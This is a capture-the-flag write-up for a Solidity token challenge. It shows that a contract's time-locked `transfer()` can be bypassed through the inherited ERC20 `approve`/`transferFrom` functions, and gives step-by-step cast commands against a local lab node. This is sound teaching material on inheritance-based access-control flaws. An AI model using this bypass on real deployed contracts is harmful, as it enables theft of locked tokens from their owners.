# ShellCoin Heritage Write-up

In this challenge, the will executor (aka the player) is given the `INITIAL_SUPPLY` of the contract (133713371333337 SHC), but can't transact them before 30 years has passed since the deployment of the contract.
The contract is overriding the `transfer()` function of the ERC20 specification by adding two modifers to it:
#### onlyExecutor: 
Which shouldn't cause a problem after calling `hireExecutor()`.
#### itsTherightTime:
Which checks if 30 years has passed since grandpa's passing (setting `grandpaPassingTime` in the constructor to `block.timestamp` means that it will hold the time in which the contract was deployed in).


But I guess you're familiar with OOP. Solidity, as any other Object Oriented Programming language, supports the notion of Inheritance.
By defining ShellCoin contract using the keyword `is ERC20`, Solidity compiler copies the base contract bytecode into derived contract bytecode, and any external and public methods or variables declared in the parent contract, will be inherited by the child contract and can be viewed or called through it.


If you check the code of ERC20.sol, you'll see that the `transfer()` function is not the only way to transfer tokens. `transferFrom()`, is a function in the ERC20 implementation that is also used to transfer tokens. The difference between it and between `transfer()` is that it allows an arbitrary sender to transfer an amount of tokens to a recipient on behalf of the owner, but he must be approved first to do so ,even if it's the owner himself (or itself if the owner is a contract xD)

## Putting it into practice:
Now enough theory, and let's dive in the solution:
- First, let's get our target contract address:
```bash
$cast call 0xA59e24aA79DdBFda2BDC740486f71a52b706E3Ea "TARGET()" --rpc-url http://localhost:8545/b51b927e-eba2-47fc-b7a7-3c76eb917217
0x0000000000000000000000005dedd5e68d4ed21760632be9a261ed57d4fa0dc6
```
  The target address is `0x5dedd5e68d4ed21760632be9a261ed57d4fa0dc6`. (Yours will be different of course)

- And then, let's call `hireExecutor()` to set ourselves as the willExecutor.
```bash
$cast send 0x5dedd5e68d4ed21760632be9a261ed57d4fa0dc6 "hireExecutor()" --private-key 0x8915d18a018cbce081c93ad075da1de18d776f347a0be058a797cc603187d55a --rpc-url http://localhost:8545/b51b927e-eba2-47fc-b7a7-3c76eb917217
```
- If you check the Setup.sol contract you'll see that the goal is to transfer all the available tokens to an external address `0xAf57Ac75f227363bB9D4d61872d81DE340BCc395`.
- So we must approve ourselves to transfer that amount of tokens, we do that by either:
```bash
$cast send 0x5dedd5e68d4ed21760632be9a261ed57d4fa0dc6 "increaseAllowance(address,uint256)" 0x34dA3791EE0a869Fa2E53Ff525aaAB0AD0c86822 133713371333337 --private-key 0x8915d18a018cbce081c93ad075da1de18d776f347a0be058a797cc603187d55a --rpc-url http://localhost:8545/b51b927e-eba2-47fc-b7a7-3c76eb917217
```
Or:
```bash
$cast send 0x5dedd5e68d4ed21760632be9a261ed57d4fa0dc6 "approve(address,uint256)" 0x34dA3791EE0a869Fa2E53Ff525aaAB0AD0c86822 133713371333337 --private-key 0x8915d18a018cbce081c93ad075da1de18d776f347a0be058a797cc603187d55a --rpc-url http://localhost:8545/b51b927e-eba2-47fc-b7a7-3c76eb917217
```
- And Lastly, we transfer the tokens to the specifed address:
```
$cast send 0x5dedd5e68d4ed21760632be9a261ed57d4fa0dc6 "transferFrom(address,address,uint256)" 0x34dA3791EE0a869Fa2E53Ff525aaAB0AD0c86822 0xAf57Ac75f227363bB9D4d61872d81DE340BCc395 133713371333337 --private-key 0x8915d18a018cbce081c93ad075da1de18d776f347a0be058a797cc603187d55a --rpc-url http://localhost:8545/b51b927e-eba2-47fc-b7a7-3c76eb917217
```
- Now we're ready to get our flag.

## Flag:
`shellmates{the_CONTrACT_1nheRiT3d__4nD_ThE_GR4nDSOn_d1D_n0t__th4T$_1mProPer_acCes$_c0nTRoL}`